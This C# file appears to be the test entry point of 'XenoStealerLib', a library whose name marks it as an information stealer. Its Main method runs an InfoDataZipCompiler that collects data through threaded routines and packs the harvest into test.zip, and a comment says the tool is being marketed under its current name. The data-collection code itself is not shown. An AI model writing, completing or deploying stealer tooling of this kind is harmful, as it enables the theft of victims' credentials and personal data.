using XenoStealerLib.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealerLib// this tools original name was going to be oceans, like the ocean's movies. But since this went into a different route on how its going to be marketed I thought it would be best to keep it on brand and stick with xeno
{
    internal class Program
    {
        static void Main(string[] args)
        {
            InfoDataZipCompiler sste = new InfoDataZipCompiler(true);
            sste.StartAndApplicationsThreaded();
            File.WriteAllBytes("test.zip", sste.GetZipBytes());
            Console.WriteLine("there should be a test.zip");
            Console.ReadLine();
        }
    }
}
